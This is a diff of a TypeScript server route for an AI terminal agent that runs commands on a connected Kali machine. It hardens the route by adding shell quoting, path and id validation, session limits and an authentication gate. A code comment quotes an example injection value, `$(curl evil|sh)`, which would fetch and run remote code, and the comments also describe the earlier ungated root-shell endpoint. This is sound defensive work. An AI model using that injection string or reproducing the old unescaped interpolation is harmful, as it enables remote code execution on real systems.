@@ -4,6 +4,11 @@ import { anthropic, DEFAULT_MODEL } from "../lib/anthropic";
 import { logger } from "../lib/logger";
 import os from "node:os";
 import path from "node:path";
+// 2026-11-15: every value that reaches a shell now goes through shq(). The old
+// code escaped only `"`, which left $(...), backticks and ${...} live inside the
+// double quotes — a path of `$(curl evil|sh)` executed on the Kali box (CWE-78).
+import { shq, heredocBody, assertSafePath, assertSafeId } from "../lib/ops/shell-quote";
+import { requireOps } from "../lib/ops/gate";
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // KALI TERMINAL AGENT — AI-powered terminal that executes on the connected Kali
@@ -37,9 +42,19 @@ type ShellSession = {
 
 const sessions = new Map<string, ShellSession>();
 
+// A caller-supplied session id used to grow this map without bound (one entry
+// per id, each holding its whole command history) — a trivial memory DoS.
+const MAX_SESSIONS = 200;
+const MAX_HISTORY = 500;
+
 function getOrCreateSession(id: string): ShellSession {
   let s = sessions.get(id);
   if (!s) {
+    if (sessions.size >= MAX_SESSIONS) {
+      // Evict the oldest-inserted session (Map preserves insertion order).
+      const oldest = sessions.keys().next();
+      if (!oldest.done) sessions.delete(oldest.value);
+    }
     s = {
       id,
       cwd: "/home/daw",
@@ -70,12 +85,18 @@ export function deleteSession(id: string): boolean {
   return sessions.delete(id);
 }
 
-// Build a shell command that sets up the session state before the user command
+// Build a shell command that sets up the session state before the user command.
+//
+// Every interpolated value is single-quoted via shq(): inside single quotes bash
+// expands nothing, so a cwd or env value containing $(...), backticks or ${...}
+// stays a literal string instead of becoming code. Env NAMES are validated
+// separately, because `export <name>=` is itself a syntax position.
 function buildSessionCommand(session: ShellSession, userCommand: string): string {
   const envExports = Object.entries(session.env)
-    .map(([k, v]) => `export ${k}="${v.replace(/"/g, '\\"')}"`)
+    .filter(([k]) => /^[A-Za-z_][A-Za-z0-9_]{0,63}$/.test(k))
+    .map(([k, v]) => `export ${k}=${shq(v)}`)
     .join("; ");
-  const cdCmd = `cd "${session.cwd.replace(/"/g, '\\"')}" 2>/dev/null || true`;
+  const cdCmd = `cd ${shq(session.cwd)} 2>/dev/null || true`;
   return `(${cdCmd}; ${envExports}; ${userCommand})`;
 }
 
@@ -289,12 +310,13 @@ async function executeTool(
 
       const summary = `$ ${command}\n` + (stdout || "[no stdout]") + (stderr ? `\n[stderr]: ${stderr}` : "") + `\n[exit=${exitCode}]`;
       session.history.push({ command, exitCode, ts: Date.now() });
+      if (session.history.length > MAX_HISTORY) session.history.shift();
       return { content: summary, meta: { exitCode, cwd: session.cwd }, ok: exitCode === 0 };
     }
     case "read_file": {
       const p = String(input.path ?? "");
       const session = getOrCreateSession(sessionId);
-      const cmd = `cat "${p.replace(/"/g, '\\"')}" 2>&1`;
+      const cmd = `cat ${shq(assertSafePath(p))} 2>&1`;
       const wrapped = buildSessionCommand(session, cmd);
       const agents = getConnectedAgentList();
       if (agents.length === 0) return { content: "No Kali device connected", ok: false };
@@ -311,9 +333,12 @@ async function executeTool(
       const content = String(input.content ?? "");
       const append = !!input.append;
       const session = getOrCreateSession(sessionId);
+      // The heredoc body is literal (quoted delimiter), and the delimiter is
+      // chosen so the payload cannot contain it — the old fixed 'KALIEOF' could
+      // be closed early by content that happened to contain that line.
       const cmd = append
-        ? `cat >> "${p.replace(/"/g, '\\"')}" << 'KALIEOF'\n${content}\nKALIEOF`
-        : `cat > "${p.replace(/"/g, '\\"')}" << 'KALIEOF'\n${content}\nKALIEOF`;
+        ? `cat >> ${shq(assertSafePath(p))} ${heredocBody(content)}`
+        : `cat > ${shq(assertSafePath(p))} ${heredocBody(content)}`;
       const wrapped = buildSessionCommand(session, cmd);
       const agents = getConnectedAgentList();
       if (agents.length === 0) return { content: "No Kali device connected", ok: false };
@@ -328,7 +353,7 @@ async function executeTool(
     case "list_dir": {
       const p = String(input.path ?? ".");
       const session = getOrCreateSession(sessionId);
-      const cmd = `ls -la "${p.replace(/"/g, '\\"')}" 2>&1`;
+      const cmd = `ls -la ${shq(assertSafePath(p))} 2>&1`;
       const wrapped = buildSessionCommand(session, cmd);
       const agents = getConnectedAgentList();
       if (agents.length === 0) return { content: "No Kali device connected", ok: false };
@@ -435,6 +460,12 @@ async function runAgentTurn(opts: {
 
 const router: IRouter = Router();
 
+// This router runs arbitrary commands on a connected Kali machine — the most
+// privileged surface in the product. It had NO gate at all: any host that could
+// reach the port could POST /kali-terminal/shell and get a root shell on the
+// agent. It now goes through the same ops gate as /api/exec and /api/local-agent.
+router.use(requireOps("kali-terminal"));
+
 router.get("/kali-terminal/health", (_req, res) => {
   const agents = getConnectedAgentList();
   res.json({
@@ -466,8 +497,16 @@ router.post("/kali-terminal/shell", async (req: Request, res: Response) => {
     res.status(400).json({ error: "command is required" });
     return;
   }
-  const sid = typeof sessionId === "string" && sessionId ? sessionId : "default";
-  await runShellOnKali(sid, command, typeof timeoutMs === "number" ? timeoutMs : 120_000, res);
+  let sid: string;
+  try {
+    sid = assertSafeId(sessionId, "default");
+  } catch (e) {
+    res.status(400).json({ error: (e as Error).message });
+    return;
+  }
+  // Clamp the timeout: an unbounded value let one request pin a session forever.
+  const tmo = typeof timeoutMs === "number" ? Math.min(Math.max(timeoutMs, 1000), 600_000) : 120_000;
+  await runShellOnKali(sid, command, tmo, res);
 });
 
 // SSE Agent chat with tool use on connected Kali device
@@ -477,8 +516,15 @@ router.post("/kali-terminal/chat", async (req: Request, res: Response) => {
     res.status(400).json({ error: "message is required" });
     return;
   }
-  const cid = typeof conversationId === "string" && conversationId ? conversationId : "default";
-  const sid = typeof sessionId === "string" && sessionId ? sessionId : cid;
+  let cid: string;
+  let sid: string;
+  try {
+    cid = assertSafeId(conversationId, "default");
+    sid = assertSafeId(sessionId, cid);
+  } catch (e) {
+    res.status(400).json({ error: (e as Error).message });
+    return;
+  }
 
   res.setHeader("Content-Type", "text/event-stream");
   res.setHeader("Cache-Control", "no-cache");
